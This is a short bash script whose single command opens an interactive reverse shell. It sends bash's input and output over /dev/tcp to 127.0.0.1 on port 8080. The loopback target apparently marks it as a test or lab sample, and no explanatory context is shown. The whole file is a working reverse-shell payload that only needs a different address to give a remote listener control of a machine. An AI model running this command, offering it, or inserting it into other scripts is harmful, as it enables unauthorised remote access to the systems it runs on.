#!/bin/bash

bash -c 'bash -i &>/dev/tcp/127.0.0.1/8080 0>&1'
